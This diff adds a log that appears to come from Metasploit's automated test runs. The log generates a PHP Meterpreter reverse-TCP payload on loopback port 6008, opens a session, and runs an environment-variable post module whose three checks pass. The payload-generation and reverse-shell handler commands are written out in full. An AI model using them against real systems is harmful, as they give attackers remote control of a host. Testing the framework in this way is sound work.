@@ -1,0 +1,27 @@
+use php/meterpreter_reverse_tcp
+msf6 post(test/file) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-7096-ej537atxt
+msf6 payload(php/meterpreter_reverse_tcp) > msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-7096-ej537atxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20230918-7096-5xso40.php -f raw AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20230918-7096-a98h4ktxt MeterpreterDebugBuild=true
+[*] Writing 34914 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20230918-7096-5xso40.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 7
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6008 
+[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:50027) at 2023-09-18 22:21:37 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=8 AddEntropy=true Verbose=true
+[*] Running against session 8
+[*] Session type is meterpreter and platform is windows
+[+] should return multiple envs
+[+] should return windows path
+[+] should handle % signs
+[*] Testing complete in 0.04 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 8 closed.
+msf6 post(test/get_env) > Stopping all jobs...
